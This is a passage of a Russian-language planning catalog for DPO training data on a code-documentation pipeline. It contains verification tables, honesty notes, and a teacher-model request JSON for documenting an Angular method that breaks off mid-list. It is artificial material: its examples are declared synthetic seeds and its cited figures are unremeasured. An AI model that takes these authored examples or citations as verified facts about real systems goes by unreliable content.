   сторон не попадает; (г) НЕ measurement circularity — held-out Q/A метрика приёмки (та самая, что
   дала `0.286`) не смеет быть производной от train-строк (source-disjoint + Jaccard-guard);
   (д) `chosen==rejected` → хард-гейт; (е) mojibake-гейт — русский текст секций Meaning под гейтом
   порчи кириллицы (живой прецедент мойибейка в этом же доменном корпусе — `RAG-02` манифест).
4. **`PromptError-05 Deterministic Shortcut` — предохранитель СКОРЕРА (не класс негатива):** сам
   `IndependentDomainScorer` НЕ смеет быть скрытым детерминированным лукапом, выдающим себя за
   trainable-судью — он eval-only детерминированный арбитр ПО ДИЗАЙНУ и назван так честно (не
   «обученный critic»); trainable-нога — это doc-юнит-СТУДЕНТ, который должен ЗАМЕНИТЬ шаблонную
   подстановку `DocumentationGeneratorUnit` выученной генерацией (allowed-level `ILogicalUnit`), а
   не скорер.
5. **Карантин-классы (§1.3 п.11):** privacy — доки/трассы ЧУЖОГО пользовательского проекта →
   `PersonalAdaptive`/`.xiigen` до redaction+approval (`BLOCK_FOR_COMMON`, R-07/R-13); легальный —
   закрытая проприетарная teacher-модель → `DATASET_REBUILD_REQUIRED`; внешние doc-корпуса
   generic-обучения → лицензионный гейт до импорта (approved source families канона
   base-wiki-training-plan); secretPresence — код-факты трассы могут нести секреты исходника
   (connection-string в цитируемой строке) → redaction до попадания в пару; leakage —
   `ExcludedLeakageSignals` (все 6, PE-6.4) с доковой оговоркой про `source_path`.
6. **`margin > 0.05`** (иначе `LOW_CONTRAST`, plan-07 :520); слабый негатив → отбраковка
   предохранителем (§1.3 п.6), НЕ обучение.
7. **Честность статуса (`catalog != capability`):** каталог = plan-content; учитель Qwen3.5-9B /
   Ollama НЕ вызывался; НИ ОДНА `GraphDpoPair` НЕ построена (0 пар); grounding-чекер/скорер/builder
   канона НЕ существуют — все capability-элементы **[условно от M1/M2]**; doc-pipeline НЕ исполнялся
   (ни `ExecuteAsync`, ни батчи генератора — только чтение кода); `Y_best`/`Y_goal`/`N1`–`N5` —
   АВТОРСКИЕ композиции (`SYNTHETIC_SEED`) ПО ФОРМЕ живого шаблона юнита (:54–:82) и контракта
   PE-4-метода (spot-read якоря процитированы), НЕ выходы реального учителя и НЕ verbatim-копии
   файлов; evidence-ids `ev-01..ev-06`, caller-ребро `ev-06`, точные xiigen-строки метода и
   «SDK-default» LangVersion — АВТОРСКАЯ проекция трассы (контракт метода — из PE-4-якоря
   `MarketplaceService.cs:27–:81`, VERIFIED-в-этом-файле; сам файл xiigen ЭТИМ пассом НЕ
   перечитывался); измеренные числа домена (`0.286`/`0.68`) — из `RAG-02`-отчётов, ЭТИМ пассом не
   перемерялись; уникальный статус домена честно ДВУСТОРОННИЙ: живой DPO-генератор + измеренный
   провал существуют, но это НЕ делает каталог capability — это делает домен ПЕРВЫМ кандидатом на
   реальный DPO-build с уже известным baseline.

#### PE-6.6 Блок 6 — ИСТОЧНИК РЕАЛИЗМА (read-only цитаты с путями; VERIFIED = живой spot-read этим пассом)

| Что обосновано | Источник (file:line) | Статус проверки этим пассом |
|---|---|---|
| Маршрут доков: `ProjectDocumentationPipelineFlowAdapter : ILogicalFlow<string>`; `FlowId="project-documentation-pipeline-flow"`; `ScenarioId="project_documentation_pipeline"`; честный вердикт `DOCUMENTATION_GRAPH_READY_TRAINING_RUNNER_MISSING`/`DOCUMENTATION_GRAPH_REVIEW_REQUIRED`; `training_status="runner_missing"` | `C:/Projects/llm_mvp_core/42.ProjectWikiDomain/ProjectDocumentationPipelineFlowAdapter.cs:7, :9–:10, :46–:48, :68` | VERIFIED (живой read головы + grep) |
| Оркестратор `: ILogicalOrchestrator`, `FlowId="project-documentation-pipeline-orchestrator"`; цепочка `GenerateAsync`→`VerifyGraphAsync`→`ValidateGraphAsync`; warning `documentation_graph_ready_training_runner_missing`; `exact_evidence_accuracy`/`entity_impact_trace_pass_rate`; honest «training runner is still missing; no trained-weight claim was made» | `.../42.ProjectWikiDomain/ProjectDocumentationPipelineOrchestrator.cs:8, :10–:11, :38, :50, :59, :74, :116–:118, :129, :132, :136, :153` | VERIFIED (живой read всего файла) |
| Живой 8-секционный шаблон дока + 8 обязательных флагов ПРИСУТСТВИЯ (`!IsNullOrWhiteSpace`, включая `EvidenceIds.Length > 0` :28) + warning `documentation_required_field_missing` + self-report `Confidence`=`flags.Count/flags.Length`; юнит = plain sealed class (НЕ `ILogicalUnit`); физически ловит только omission, не false-presence | `.../42.ProjectWikiDomain/DocumentationGeneratorUnit.cs:6, :8, :11, :19–:30, :43, :54–:82` | VERIFIED (живой read всего файла) |
| Живой доменный DPO-предшественник: батч-гейты (`batch_row_count_not_50`, `wrong_annotation_rate_below_gate`); `[WRONG:]` в rejected-тексте; **counted 10 rejected-веток (9 `missing_*` + `partial_documentation`) — ВСЕ omission/false-absence, 0 hallucination/false-presence**; `must_include_*` промпт | `.../42.ProjectWikiDomain/DocumentationGeneratorDpoGenerator.cs:15–:52 (:39–:44 гейты), :58–:71, :74–:97 (:83–:84 missing_evidence), :194–:243 (RejectedType)` | VERIFIED (живой read всего файла) |
| Записи домена: `DocumentationGeneratorOutput` (12 полей, №11 `Confidence` double); `DocumentationGeneratorDpoPair(PairId, Unit, A, Chosen, Rejected, RejectedType)`; `ProjectDocumentationUnit` (15 counted полей) | `.../42.ProjectWikiDomain/ProjectWikiDomainModels.cs:1126–:1138, :1140–:1146, :1561–:1576` | VERIFIED (живой grep-окна) |
| THE-пробел локализован: false-presence watch-сигналы `invented_callee 0.9` (CodeTraceBuilder) / `wrong_project_evidence 0.8` (EntityImpactMapper) живут в СИБЛИНГ-юнитах; `DocumentationGenerator` PROMOTED только для SP-docs и гейтит только omission | `RAG-02-orchestrator-extension.md:253, :254, :255` | VERIFIED (живой grep) |
| Измеренный провал base-модели доков: `generic_documentation_qa_accuracy=0.286` (порог 0.90), `hallucination_rate=0.68` (порог 0.00); диагноз: hash-token раннер + отсутствует обученный `ProjectWikiQueryPlanningFlow` | `RAG-02-orchestrator-extension.md:22, :28–:29, :59–:60` | VERIFIED (живой grep — точные числа) |
| Free=.NET tier назван ПО ИМЕНИ 42-домена (LegScope=common-кандидат) | `RAG-02-orchestrator-extension.md:18` | VERIFIED (живой grep) |
| Изначальная цель проекта = офлайн-документирование кода; `local_wiki_planning` поглощён 42/43; `ProjectLocalWikiModelUnit` fixed-confidence ~0.35 (R4-флаг); wiki-content DPO-seed — один из немногих живых | `RAG-01-compare-branches.md:10, :42, :252, :253` | CITED (карта источника; grep-подтверждение через RAG-02-индекс :253–:255, этим пассом RAG-01 не перечитан построчно) |
| Документируемый метод-якорь (контракт): `PublishListingAsync` сигнатура `Task<DataProcessResult<...>>`; guard-коды FLOW_ID/FLOW_SLUG/MODULE_NAME/PACKAGE_REQUIRED; детерминированный `ListingId`; `IDocumentStore.UpsertAsync("marketplace-listings")`; null НЕ возвращается | `MarketplaceService.cs:27–:81` через каталог PE-4.2/PE-4.6 (`:1225–:1314`) | VERIFIED-в-этом-файле (PE-4-якорь; сам xiigen-файл ЭТИМ пассом НЕ перечитан) |
| 14 полей `GraphDpoPair` (канон пары, owner блок 07) | `active-codex-execution-plan-07-dpo-builder.md:246–:261` (через §1.4 каталога) | VERIFIED (владелец §1.4; reward-секция читана живьём) |
| Reward-scalarization: `reward(side)=Beta·(policyLogP−referenceLogP)` + `margin` + `preference_score`-only + `REWARD_EXTRACTOR_MISSING` | `active-codex-execution-plan-07-dpo-builder.md:341–:360` | VERIFIED (живой read этим пассом) |
| Bounded teacher-call Шаг 3a + budget num_ctx≈8192 + `k_generations=4` + `TeacherProvenanceAdapter` + acceptance-independence + Y_best determinism | `active-codex-execution-plan-09-auto-dpo-loop.md` §Шаг 3a :492–:502, :497–:498, :504–:544 | CITED (владелец каталога §1.1; PE-3 VERIFIED live; этим пассом через §1.1/§1.4) |
| Профиль учителя `qwen35-local-v1` (num_ctx≈8192, local self-hosted open-weight) + `TeacherProvenance` 20 полей | `active-codex-execution-plan-08-legal-teacher-gate.md` §3.5.2 :779–:833, §3.1 :389–:409 | CITED (владелец каталога §1.1/§1.4; этим пассом не перечитан) |
| `TP1_LOCAL` eval/quarantine до `G-DPO-FINAL` (`DpoTrainReady=false`, нет `TrainBatchAsync`) | `active-codex-execution-two-phase-local-remote-overlay.md:48–:53` | CITED (владелец каталога карта; PE-2..PE-5 VERIFIED live) |
| Секция-источник переноса (перенос с переякориванием) | `PLAN-VS-VSCODE-CONTINUE-v1.md:4948–:5196` (проход PE-6 Fable) | VERIFIED (живой read) |
| «Documentation follows code» (класс `N4`) + «Project wiki domain» (`DOCUMENTATION_GRAPH_READY_TRAINING_RUNNER_MISSING`/`runner_missing`) + R6/Rule 2 DNA (fabric-first, класс `N5`) | `llm_mvp_core/CLAUDE.md` — секции «Documentation follows code», «Project wiki domain», «The 10 Rules» | CITED (родственный репо; секции «Project wiki domain» сверены с живым кодом домена этим пассом) |
| Серверный код того же метода (кросс-задачная симметрия улучшить-код ↔ задокументировать-код) | этот каталог PE-4.2/PE-4.6 (`:1225–:1314`) | VERIFIED (в этом же файле) |

#### PE6-ЛОГ — Что добавлено + счётчики + честность

1. **Добавлено (append-only):** эта секция «Prompt-Examples проход PE-6/10 — Задача 5 — Серверная
   документация» (блоки 1–6); обновлена ОДНА строка статус-таблицы §5.2 (Серверная документация →
   ЗАПОЛНЕНО PE-6, маркер `[FIX-PE-6]`) и front-matter `pass` + `pass_pe6_fill` (single-owner FC-44:
   заголовок и строка статуса свипнуты в ОДНОМ шаге, `stale-status-carrier` исключён). Прочий старый
   текст НЕ переписан.
2. **Счётчики — БЕЗ изменений:** WO 53 / решения 26 / ветки 55 / связи 21 / M5=46 — каталог =
   plan-content, не work-order; реального нового WO проход не создал (движение счётчика возможно
   только в PE-10). `readiness` плана (`PLAN_NOT_READY`) НЕ тронут.
3. **Пакет честности:** изменён ТОЛЬКО этот файл. Примеры — ПЛАНОВЫЕ ОБРАЗЦЫ: Ollama/учитель НЕ
   вызывался; НИ ОДНА `GraphDpoPair` НЕ построена (0 пар); grounding-чекер/скорер/builder/обучаемый
   doc-юнит канона в коде НЕ существуют; doc-pipeline НЕ исполнялся (только чтение кода);
   `Y_best`/`Y_goal`/`N1`–`N5` — АВТОРСКИЕ композиции (`SYNTHETIC_SEED`) ПО ФОРМЕ живого шаблона
   юнита и контракта PE-4-метода, НЕ выходы реальных моделей и НЕ verbatim-копии файлов;
   evidence-ids/caller-ребро/точные xiigen-строки — авторская проекция трассы (контракт метода —
   PE-4-якорь VERIFIED-в-этом-файле, сам xiigen-файл ЭТИМ пассом НЕ перечитывался — честный
   downgrade против образца-Fable, который заявлял свежий xiigen spot-read); числа `0.286`/`0.68` —
   из `RAG-02`, не перемерялись; overlap-значения — целевые by construction, НЕ измеренный
   `overlap_ratio`; порог `0.75` doc-гейта — концептуальный перенос PE-4.4, НЕ калиброванный;
   токен-оценки бюджета — аппроксимация; продуктовый код/тесты/git-write НЕ выполнялись.
   **Против образца-Fable этот проход богаче на counted spot-read:** ПОСЧИТАНЫ реальные тоталы
   таксономии генератора (**10 rejected-веток: 9 `missing_*` + `partial_documentation`, ВСЕ omission,
   0 false-presence** — образец говорил «9 counted»), локализован THE-пробел (false-presence
   watch-сигналы `invented_callee`/`wrong_project_evidence` заперты в СИБЛИНГ-юнитах CodeTraceBuilder/
   EntityImpactMapper, `RAG-02` :253–:254 — не в doc-генераторе); flip `DpoTrainReady` `true→false`
   (у образца `true` — у нас это `dual-live-canon` статуса готовности, FC-44); все 6
   `ExcludedLeakageSignals` (образец нёс 5, терял `source_id`); честный method-anchor downgrade
   (контракт через PE-4 in-file, без ложной заявки на свежий xiigen-read). Spot-read ≠ полное чтение
   домена: из ~96 файлов 42-домена прочитаны целиком 3 (`DocumentationGeneratorUnit`,
   `DocumentationGeneratorDpoGenerator`, `ProjectDocumentationPipelineOrchestrator`) + голова
   `ProjectDocumentationPipelineFlowAdapter` + grep-окна `ProjectWikiDomainModels`;
   `DocumentationOrchestrator.cs`/`ProjectWikiCoverageVerifier.cs`/`ProjectWikiRealProjectValidationRunner.cs`
   НЕ читались (названы по вызовам оркестратора). Негативы покрывают 5 классов (1 доменно-локальный
   критический false-presence + 4 канонических); живые 10 omission-веток генератора не дублировались
   (существующий seed), полный баланс классов = обязанность DPO-build. Валидация прохода = Opus 4.8
   (родитель) ДО старта PE-7 (клиентская документация).

---
*Конец прохода PE-6/10. PE-7 (Клиентская документация — тот же 42-домен над Angular-кодом) стартует
после валидации Opus 4.8 этого прохода. Канон-переключение PE-7 (нота для следующего прохода):
документируемый СУБЪЕКТ = Angular → Paid-домен (LegScope переобосновывается через сплит
«механика-vs-строки»: механика конвейера = 42 Free-домен, но документируемые СТРОКИ = Paid Angular);
grounding-инвариант ОСТРЕЕ — живой Angular-корпус (47 статических signal-демо, 0 HttpClient/RxJS по
counted spot-read PE-5) означает, что «док про API-wiring» = галлюцинация by construction до реального
подключения клиентов (в код-домене PE-5 SYNTHETIC_SEED-форвард был легален, в док-домене
grounding-инвариант его ЗАПРЕЩАЕТ); таксономия — та же строка 5/6 карты §3 + доменно-локальный
`doc_wrong_framework_terminology` (ось «терминология фреймворка», намеренный сплит AngularJS↔Angular);
`DpoTrainReady=false` [условно от M1 + G-DPO-FINAL] сохраняется.*

---

## Prompt-Examples проход PE-7/10 — Задача 6 — Клиентская документация (`42.ProjectWikiDomain` doc-pipeline над Angular)

**[FIX-PE-7]** **Дата:** 2026-07-14. **Автор:** Opus 4.8 (Ultracode), одиночный
bounded architect-author прохода PE-7/10 (PLAN-ONLY, R2: ни продуктового кода, ни
тестов, ни ollama, ни git-write; правился ТОЛЬКО этот файл; наш план 07/08/09/overlay,
`RAG-02`/`RAG-01` и живой код `42.ProjectWikiDomain` в `llm_mvp_core` + живой Angular-корпус
`xiigen-flows` читались read-only). **Авторитет:** живая unquoted-директива Luba 2026-07-13
(каталог примеров промптов positive/negative под 8 задач, «в соответствии с реализацией»,
переносом из плана-источника с переякориванием на наш канон) + вердикт Opus 4.8 на PE-6 — VALID.
Содержание = заполненный шаблон §2.1 для задачи 6 «Клиентская документация». Перенос из
секции-источника «Prompt-Examples проход 7/10 (Fable)» (`PLAN-VS-VSCODE-CONTINUE-v1.md`
:5200–:5458): ярлыки источника `2PH-2.x/2PH-3.x/PE-1.x` переякорены на наши блоки 07/08/09 +
overlay + §1–§5. Второй канон НЕ создаётся.

**Канон-переключение против образца-Fable (по праву §2.3 + CARRY PE-6→PE-7 + counted spot-read
ЭТИМ пассом):**
- **(а) Тот же doc-домен, что PE-6; меняется только документируемый СУБЪЕКТ — .NET → Angular.**
  Владелец-конвейер `42.ProjectWikiDomain` `project_documentation_pipeline` НЕ меняется (те же
  якоря PE-6.1: `ProjectDocumentationPipelineFlowAdapter`/`ProjectDocumentationPipelineOrchestrator`,
  честный runtime-вердикт `runner_missing`); механика языко-агностична, ветвление шаблона ТОЛЬКО
  `IsStoredProcedureUnit` (`DocumentationGeneratorUnit.cs:16`) — `.ts`-юнит детерминированно идёт в
  тот же generic 8-секционный шаблон (:54–:82), что документировал .NET в PE-6.
- **(б) Таксономия негативов = строка 6 карты §3 («те же, что #5» + терминология фреймворка) с
  ДВУМЯ явными формами галлюцинационной оси, инстанцированными ОБЕ:** **FALSE-PRESENCE**
  (`doc_hallucinated_claim` — код PE-6 переиспользуется, no dual-canon, single-owner FC-44: док
  заявляет поведение, которого у кода НЕТ) и **FALSE-ABSENCE** (новый явный доменно-локальный
  `doc_omitted_behavior_false_absence`: док замалчивает поведение, которое у кода ЕСТЬ — вся живая
  доменная семья `missing_*` этого класса, но на уровне СЕКЦИЙ; N4 инстанцирует его на уровне
  ПОВЕДЕНИЯ внутри заполненных секций) + доменно-локальный `doc_wrong_framework_terminology` (ось
  строки 6 «+ терминология фреймворка»; обоснование — намеренный сплит AngularJS↔Angular языковых
  планов, `RAG-02` :860) + 2 канонических кода строки 5/6 карты (`ORCH-02 Missing Evidence` +
  `PromptError-11 Vague Deliverables`). Пара форм N1↔N4 — намеренный КОНТРАСТ
  false-presence↔false-absence (инсайт PE-6 инстанцирован ОБЕИМИ формами).
- **(в) Ось скорера — evidence-grounding дифференциал PE-6.4, РАСШИРЕННЫЙ до БИНАПРАВЛЕННОГО**
  (ключевой вклад этого прохода): unsupported-claim сторона (false-presence) + uncovered-fact
  сторона (false-absence), по одной на каждую негативную форму. Doc-overlap `0.75` (рестейт
  PE-4.4/PE-5.4/PE-6.4 с доковой рамкой) остаётся ВТОРИЧНЫМ (PE-7.4).
- **(г) LegScope = `PersonalAdaptive` (Paid=Angular) — ПЕРЕОБОСНОВАНИЕ против common-кандидата PE-6:**
  у PE-6 `common` держался на том, что `RAG-02` :18 называет Free-tier ПО ИМЕНИ 42-домена. Для
  клиента это основание НЕ переносится: Free-tier имя покрывает МЕХАНИКУ конвейера (шаблоны/флаги/
  гейты), но монетизационный сплит лицензирует ДОКУМЕНТИРУЕМЫЙ СТЕК — Paid=Angular (`RAG-02` :18/:933).
  Сплит «механика-vs-строки»: сам конвейер = Free/common, но DPO-СТРОКИ, обучающие способность
  «документировать Angular», кормить free-common ногу НЕ смеют. Ближайшая честная проекция бинарной
  схемы = `PersonalAdaptive` (paid-domain, license-gated) — продуктовая граница, не privacy.
- **(д) `DpoTrainReady=false` [условно от M1 + G-DPO-FINAL] — ФЛИП против образца-Fable (тот ставил
  `true`):** как PE-2/PE-3/PE-4/PE-5/PE-6, наш каталог требует `false` до `G-DPO-FINAL` для ВСЕХ
  задач, иначе `dual-live-canon` статуса готовности (FC-44). Клиентский baseline `0.286`/`0.68`
  измерен на .NET-корпусе и на Angular НЕ переносится (Multi-Language: English promoted, TS PENDING,
  `RAG-02` :932/:954) — это generic-предупреждение о КЛАССЕ дефекта, не клиентский baseline.

### Задача 6 — Клиентская документация (`42.ProjectWikiDomain` doc-pipeline над Angular)

#### PE-7.1 Блок 1 — ДОМЕН РЕАЛИЗАЦИИ + адресация пары

По-человечески: задача 6 — тот же продукт, что задача 5 (project-local wiki: «задокументируй /
улучши документацию этого метода»), но документируемый субъект — КЛИЕНТСКИЙ Angular/TypeScript-код.
Пользователь расширения VS/VS Code просит «задокументируй этот Angular-метод»; конвейер домена тот
же, что PE-6: запрос документации → code trace → documentation graph → negative DPO candidates →
evidence index → project-local wiki ответ. Владелец-домен (карта §3 строка 6) — `42.ProjectWikiDomain`
(`llm_mvp_core`); документируемый корпус (карта §3 строка 6) — живой Angular `xiigen-flows`
(`flows/FLOW-NN-*/client/angular/`). Подтверждено ЖИВЫМ counted spot-read ЭТИМ пассом (богаче
образца-Fable: перечитаны и Angular-корпус, и `.cs`-механика домена).

**Counted spot-read факты ЭТИМ пассом (grep/read, ПОСЧИТАНО, не оценки — гейт claim-verification
«посчитанные тоталы»):**
1. **Механика doc-конвейера языко-агностична, маршрутизация подтверждена кодом.**
   `DocumentationGeneratorUnit.Generate` ветвится ТОЛЬКО `IsStoredProcedureUnit` (`.cs:16`): SQL-шаблон
   — только для `SourcePath.EndsWith(".sql")` либо `@`-параметров (:50); юнит с `SourcePath=*.ts`
   детерминированно идёт в `GenerateGenericDocumentation` — тот же живой 8-секционный шаблон (:54–:82)
   и те же 8 counted обязательных флагов ПРИСУТСТВИЯ (:19–:29, `!IsNullOrWhiteSpace`/`Length>0`), что
   документировали .NET в PE-6. Отдельного «Angular-шаблона» в коде НЕТ; warning
   `documentation_required_field_missing` (:30); self-report `Confidence` = `flags.Count/flags.Length`
   (:43). Ключевой факт для THE-негатива (тот же, что PE-6): все 8 флагов — проверки ПРИСУТСТВИЯ; юнит
   физически НЕ умеет поймать утверждение, которое ПРИСУТСТВУЕТ, но ЛОЖНО (hallucination) — только
   отсутствие поля.
2. **Клиентская нога уже РАЗЛИЧАЕТСЯ живым кодом.** `ProjectLocalWikiModelUnit.IsClientEvidence`
   (`.cs:152`) распознаёт client-evidence по `.ts`/`.js` в `SourcePath` либо Angular/React/client в
   `Meaning`; cross-stack секция ответа строит «Client path / Server path / Database path» (:115) и
   честно репортит `missing ... client component/service evidence`. Т.е. клиентский лег домена — не
   выдумка каталога, а живой маршрут (родство `RAG-02` :954: «`IsClientEvidence` уже есть в коде»).
3. **Живая негативная таксономия домена — вся FALSE-ABSENCE.** switch `BuildRejected`
   (`DocumentationGeneratorDpoGenerator.cs`) = **9 именованных omission-классов** (4 generic:
   `missing_callers` :77 / `missing_callees` :79 / `missing_stack_version` :81 / `missing_evidence`
   :83 [«produces text that cannot be cited or verified»] + 5 SQL :85–:93) **+ 1 default
   `partial_documentation`** (:95–:96) — counted 10 веток, ВСЕ класса «замалчивание существующего»
   (false-absence); классов «выдумка несуществующего» (false-presence) — 0. Даже ближайший к ложному
   утверждению случай `missing_sql_side_effects` (:89 — «marks a state-changing procedure as safe»)
   закодирован как «missing», не как «wrong assertion». Клиентский N1 этого прохода — seed ровно
   недостающего класса (перенос вывода PE-6 на клиентский корпус); клиентский N4 — недостающая грань
   живого seed (false-absence на уровне поведения, не секции).
4. **Документируемый живой корпус — 47 СТАТИЧЕСКИХ signal-демо (СВЕЖИЙ counted survey ЭТИМ пассом).**
   47 каталогов `flows/*/client/angular/src`; объединённый grep `HttpClient|.subscribe(|FormBuilder|
   takeUntilDestroyed|@angular/common/http|from 'rxjs'` = **0 файлов-хитов** по всем 47; **47 файлов
   используют `signal()`** (независимое повторение survey PE-5 — результат совпал: 0 транспорта; grep
   ЭТОГО прохода ЖЁСТЧЕ — одним запросом покрыл и `takeUntilDestroyed`, и import из `rxjs`). Якорный
   компонент FLOW-01: `app.ts` 169 строк / `app.html` 148 строк (ПОЛНЫЙ re-read ЭТИМ пассом);
   `@angular/core ^21.2.0` / `rxjs ~7.8.0` (объявлен, в `src` не используется) / `typescript ~5.9.2`
   (`package.json` :18/:22/:32).

**Carrier-находка (честная, живая, VERIFIED ЭТИМ пассом — кандидат PE-10, НЕ починка):** 15-полевой
`ProjectDocumentationUnit` (`ProjectWikiDomainModels.cs:1561–:1576`) несёт версию языка в поле,
буквально названном **`CSharpLanguageVersion`** (`:1570`, VERIFIED точной строкой), обязательный флаг
7 требует его непустым, живой шаблон печатает литерал `C# language version:` (`DocumentationGeneratorUnit.cs`
:78 и :114), а живой rejected-класс `missing_stack_version` прямо говорит «framework and C# version
constraints … legacy .NET documentation» (генератор :82). Для Angular-юнита носителем версии
TypeScript становится .NET-именованное поле — механика работает, ИМЕНА носителей `.NET`-флейворные.
Это observation (schema-generalization = кандидат PE-10/DPO-build), НЕ починка этим пассом (carrier
работает, чинить нечего для примера — но имя вводит в заблуждение, PE-10 обязан пометить).

**Записи домена (counted, `ProjectWikiDomainModels.cs`):** `DocumentationGeneratorOutput` — 12 полей,
№11 `Confidence` (double) (:1126); `DocumentationGeneratorDpoPair(PairId, Unit, A, Chosen, Rejected,
RejectedType)` (:1140) — доменный record, **НЕ второй канон пары**: `GraphDpoPair` (14 полей, блок 07,
§1.4) остаётся каноном, live→канон маппинг — обязанность builder'а WO-M1.1; типизированный вход
`ProjectDocumentationUnit` — **15 counted полей** (`DocumentationUnitId, ProjectId, RepositoryRoot,
SourcePath, SourceLine, SymbolName, DocumentationLevel, TargetFramework, CSharpLanguageVersion, Meaning,
Parameters[], ReturnValue, Callees[], Callers[], EvidenceIds[]`, :1561–:1576).

Адресация пар (канон блока 07 — `GraphDpoPair.Level` / `NodeOrEdgeId`, §1.4):
- **`Level="unit"`** (train-ready ОБЯЗАН быть `"unit"`, plan-07 :248) — единица = ОДИН короткий
  wiki-док ОДНОГО метода компонента в жёстком 8-секционном шаблоне, НЕ node/edge-план.
- **`NodeOrEdgeId="client-docs/xiigen-flows/flow01-app-submit-registration"`** — паттерн карты §3
  строки 6 (`client-docs/<проект>/<файл>`).
- **LegScope: `PersonalAdaptive` (Paid=Angular) — переобоснование против common-кандидата PE-6:**
  `RAG-02` :18/:933 (Paid=Angular/AngularJS/Java/SQL; `LicenseManager.CheckDomain`+`DomainLoader`+CDN;
  приватный репо `xiigen_smart_domains`); per-stack план `PLAN-WIKI-TRAINING-ANGULAR-v1` живёт в
  платной языковой семье (`RAG-02` :855/:860). Сплит «механика-vs-строки»: конвейер = Free/common, но
  DPO-строки способности «документировать Angular» = Paid → `PersonalAdaptive` (NOT-for-free-common);
  финальный сплит = `LUBA_PRODUCT_DECISION_RESIDUAL` (кандидат PE-10). **[pass-time PE-6; SUPERSEDED FIX-RES-1
  2026-07-14: задача 6 (Angular-документация) → `RESOLVED_FROM_DOCUMENTED_AUTHORITY` (G4), остаётся non-blocking
  opt-in `paid-domain common leg`.]** Чужой пользовательский
  клиент-код — дополнительно `.xiigen`/`PersonalAdaptive` до redaction+approval (R-07/R-13).
- Честные ноты домена: (а) обучаемый doc-юнит НЕ доказан; baseline-числа НЕ переносятся: `0.286`/`0.68`
  (`RAG-02` :22) измерены на wiki/doc-корпусе **.NET** (Angular-doc held-out НИКОГДА не мерился, TS
  PENDING) — для клиента это generic-предупреждение о КЛАССЕ дефекта, не клиентский baseline;
  (б) маршрут `TrainBatchAsync`→юнит — **[условно от M1/M2]**, runtime заканчивается детерминированными
  Bootstrap-юнитами, чекпойнты не грузятся; (в) документируемая реальность = СТАТИЧЕСКИЕ демо —
  главный доменный факт всего прохода: ловушка false-presence живёт ПРЯМО в UI-строке кода (Блок 2).

#### PE-7.2 Блок 2 — POSITIVE (chosen) пример промпта

Сценарий (реальный якорь — живой метод `App.submitRegistration()`,
`flows/FLOW-01-user-registration/client/angular/src/app/app.ts:98–:101`, ПОЛНЫЙ spot-read ЭТИМ
пассом): улучшить документацию метода submit регистрации Angular-компонента FLOW-01. **Доменная
ловушка, ради которой выбран именно этот метод:** его собственная UI-строка (:100) говорит
«Registration is saved. A verification email has been queued for delivery» — а КОД не выполняет ни
одного сетевого вызова (imports :1–:3 без `HttpClient`; survey 0 хитов по всем 47): наивный
документатор, читающий СТРОКИ, а не ПОВЕДЕНИЕ, произведёт ровно измеренный false-presence класс
(`0.68`). `Y_best` — правдоподобный слабый док (ложное серверное утверждение + выдуманный параметр +
пустой Evidence); `Y_goal` — evidence-grounded док РЕАЛЬНОГО (статического) поведения, где отсутствие
транспорта задокументировано ЯВНО с опорой на absence-evidence.

**(а) Bounded teacher-call (наш plan-09 §Шаг 3a :492–:502) — заполненный request-JSON (учитель
Qwen3.5-9B, профиль `qwen35-local-v1` plan-08 §3.5.2, видит ТОЛЬКО эти поля, НЕ репозиторий и НЕ
код-базу):**

```json
{
  "task": "Улучшить документацию этого метода Angular-компонента (standalone signal-компонент Angular 21, статическое демо) в формате wiki-юнита (8 секций живого шаблона DocumentationGeneratorUnit). КАЖДОЕ утверждение обязано опираться на код-факт (file:line ЛИБО evidence-id) из input_context; поведение, которого НЕТ в трассе, документировать ЗАПРЕЩЕНО — в частности запрещены утверждения про HTTP/сервер/подписки: их в трассе НЕТ (см. ev-07), а текст UI-сообщения — строка интерфейса, НЕ выполняемое поведение. Объясни WHY (зачем метод существует в демо-потоке), HOW (какие сигналы и как мутирует), WHAT (точный контракт: параметры/возврат/видимые эффекты шаблона). Не выходи за пределы одного метода.",
  "target_unit": "client-docs/xiigen-flows/flow01-app-submit-registration",
  "input_context": "documentation_unit (проекция 15-полевого ProjectDocumentationUnit, модели :1561–:1576; carrier-нота: версия языка едет в поле CSharpLanguageVersion :1570): symbol=App.submitRegistration; source=flows/FLOW-01-user-registration/client/angular/src/app/app.ts:98; target_framework=Angular 21.2 standalone (package.json:18); language_version=TypeScript ~5.9.2 (package.json:32); signature: submitRegistration(): void — параметров НЕТ; код-факты трассы (evidence): [ev-01] standalone-декларация @Component({selector:'app-root', imports:[CommonModule,FormsModule], templateUrl, styleUrl}) :21–:26; [ev-02] сигналы состояния :29–:36 — email (:33), password (:34), token (:35), journeyState (:31), message (:36); тело метода form-сигналы НЕ читает; [ev-03] тело :98–:101 — ровно две мутации: journeyState.set('pending') (:99), message.set('Registration is saved. A verification email has been queued for delivery.') (:100); [ev-04] вызывающая кнопка шаблона: <button data-testid=\"submit-registration\" (click)=\"submitRegistration()\"> app.html:57; [ev-05] статусный блок: <section role=\"status\" data-testid=\"status-message\">{{ message() }}</section> app.html:40; [ev-06] pending-ветка шаблона: @else if (journeyState() === 'pending') → экран 'Check your email' app.html:60–:61; [ev-07] ABSENCE-факты: imports :1–:3 без HttpClient; survey всех 47 клиентов: 0 хитов HttpClient/.subscribe(/FormBuilder/takeUntilDestroyed/@angular/common/http/rxjs-import; rxjs ~7.8.0 объявлен, в src не используется",
  "current_best_output": "<Y_best-док — слабый черновик, развёрнут в блоке ниже; в транспорте — JSON-escaped строка>",
  "requirements": [
    "evidence-grounding (ПЕРВИЧНАЯ ось): каждое claim-предложение дока несёт привязку (file:line ЛИБО evidence-id) к код-факту из input_context; grounding rate = 1.0",
    "hallucination = 0 — ОБЕ формы (ось RAG-02, порог 0.00 при измеренном .NET-провале 0.68): false-presence — ни одного утверждения о поведении, которого нет в трассе (HTTP/POST/подписка/сервер/очередь писем/валидация формы запрещены как УТВЕРЖДЕНИЯ; легальны ТОЛЬКО в отрицательной форме с опорой на ev-07 — ось скорера doc_hallucinated_claim); false-absence — ни один контракт-критичный факт трассы не замолчан (обе мутации сигналов, Called By, absence-факт — ось скорера doc_omitted_behavior_false_absence)",
    "contract-accuracy: сигнатура byte-exact (submitRegistration(): void, БЕЗ параметров); имена сигналов/значений/testids byte-exact к трассе ('pending', data-testid=\"submit-registration\", data-testid=\"status-message\")",
    "терминология фреймворка: словарь Angular 21 (standalone, signal, WritableSignal.set, @if/@for); словарь AngularJS ($scope, controller, digest, двусторонний ng-model) ЗАПРЕЩЁН — ось скорера doc_wrong_framework_terminology",
